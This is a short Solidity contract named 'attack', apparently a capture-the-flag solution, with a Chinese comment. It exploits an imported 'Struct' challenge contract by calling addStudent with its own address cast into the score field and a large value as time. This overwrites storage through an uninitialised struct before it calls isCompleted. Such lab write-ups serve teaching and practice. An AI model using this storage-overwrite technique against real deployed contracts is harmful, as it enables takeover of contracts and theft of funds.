/*
没有攻击合约，在调用addStudent函数的时候，score输自己的地址，time输一个比1000000000000大的数即可。
*/
pragma solidity ^0.4.24;
import "./struct.sol";
contract attack{
    Struct s;
    constructor(address _s)public{
        s = Struct(_s);
    }

    function complete()public{
        s.addStudent(uint256(uint160(address(this))),1 ether);
        s.isCompleted();
    }
}